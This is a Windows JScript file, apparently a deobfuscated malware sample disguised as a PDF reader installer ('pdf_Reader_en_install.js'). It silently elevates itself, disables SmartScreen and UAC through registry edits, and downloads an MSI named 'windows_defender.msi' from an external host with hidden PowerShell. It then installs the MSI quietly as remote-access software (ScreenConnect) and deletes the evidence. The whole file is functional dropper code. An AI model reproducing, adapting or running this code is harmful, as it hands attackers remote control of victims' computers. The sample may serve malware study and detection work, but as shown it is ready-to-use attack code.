/**
 * pdf_Reader_en_install.js - Cleaned Source Code
 * Purpose: Silently installs ScreenConnect and disables Windows SmartScreen.
 */

var shell = WScript.CreateObject("WScript.Shell");
var fso = WScript.CreateObject("Scripting.FileSystemObject");
var tempDir = shell.ExpandEnvironmentStrings("%TEMP%");
var logPath = tempDir + "\\disable-and-install.log";

function log(msg) {
    try {
        var file = fso.OpenTextFile(logPath, 8, true);
        var timestamp = new Date().toLocaleString();
        file.WriteLine("[" + timestamp + "] " + msg);
        file.Close();
    } catch (e) {
        // Fallback to C:\Windows\Temp if %TEMP% fails
        try {
            var fallbackLog = "C:\\Windows\\Temp\\disable-and-install.log";
            var fileFallback = fso.OpenTextFile(fallbackLog, 8, true);
            fileFallback.WriteLine("[" + new Date().toLocaleString() + "] " + msg);
            fileFallback.Close();
        } catch (err) { }
    }
}

function logError(msg, err) {
    var fullMsg = msg;
    if (err) {
        fullMsg += " - Error: " + (err.message || err.description || err.toString());
    }
    log("ERROR: " + fullMsg);
}

log("========================================");
log("Script started: disable-and-install.js");

// 1. Check for Elevation
if (!WScript.Arguments.Named.Exists("elevate")) {
    log("Not running as admin. Requesting elevation...");
    var shellApp = WScript.CreateObject("Shell.Application");
    var scriptPath = WScript.ScriptFullName;
    var args = "\"" + scriptPath + "\"";

    for (var i = 0; i < WScript.Arguments.Length; i++) {
        var arg = WScript.Arguments(i);
        if (arg && arg.indexOf("http") === 0) {
            args += " \"" + arg + "\"";
        }
    }
    args += " /elevate";
    shellApp.ShellExecute("cscript.exe", "//nologo //B " + args, "", "runas", 0);
    WScript.Quit();
}

log("Running with administrator privileges");

// 2. Disable SmartScreen via Registry
try {
    log("Step 1: Disabling SmartScreen...");
    var regKeys = [
        { path: "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer", key: "SmartScreenEnabled", value: "Off", type: "REG_SZ" },
        { path: "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost", key: "EnableWebContentEvaluation", value: "0", type: "REG_DWORD" },
        { path: "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost", key: "EnableWebContentEvaluation", value: "0", type: "REG_DWORD" },
        { path: "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", key: "EnableLUA", value: "Off", type: "REG_SZ" },
    ];

    for (var i = 0; i < regKeys.length; i++) {
        var r = regKeys[i];
        shell.Run("reg add \"" + r.path + "\" /f", 0, true);
        var cmd = "reg add \"" + r.path + "\" /v \"" + r.key + "\" /t " + r.type + " /d \"" + r.value + "\" /f";
        shell.Run(cmd, 0, true);
    }

    // Group Policy Key
    var gpPath = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System";
    shell.Run("reg add \"" + gpPath + "\" /f", 0, true);
    shell.Run("reg add \"" + gpPath + "\" /v \"EnableSmartScreen\" /t REG_DWORD /d 0 /f", 0, true);

} catch (e) {
    logError("SmartScreen disable failed", e);
}

// 3. Download and Install MSI
var downloadUrl = "https://d1.tfdl.net/public/2026-04-28/d81b2f70-1817-4b23-928c-34aaac22a907/windows_defender.msi";
for (var i = 0; i < WScript.Arguments.Length; i++) {
    var arg = WScript.Arguments(i);
    if (arg && arg !== "/elevate" && arg.indexOf("/") !== 0 && arg.indexOf("http") === 0) {
        downloadUrl = arg;
        break;
    }
}

var msiPath = "C:\\Windows\\Temp\\Installer.msi";
var psPath = "C:\\Windows\\Temp\\download.ps1";

try {
    log("Starting download from: " + downloadUrl);
    var psScript = '$ErrorActionPreference = "Stop"; try { ' +
        '(New-Object System.Net.WebClient).DownloadFile("' + downloadUrl + '", "' + msiPath + '"); ' +
        'Exit 0 } catch { Exit 1 }';

    var f = fso.CreateTextFile(psPath, true);
    f.Write(psScript);
    f.Close();

    var exitCode = shell.Run("powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File \"" + psPath + "\"", 0, true);

    if (exitCode === 0 && fso.FileExists(msiPath)) {
        log("Download successful. Starting MSI installation...");
        shell.Run("msiexec /i \"" + msiPath + "\" /qn /norestart", 0, true);
        WScript.Sleep(3000);
        fso.DeleteFile(msiPath);
        log("Installation completed successfully.");
    } else {
        log("Download failed or file not found.");
    }

    if (fso.FileExists(psPath)) fso.DeleteFile(psPath);
} catch (e) {
    logError("Installation process failed", e);
}

log("Script completed.");
WScript.Quit(0);
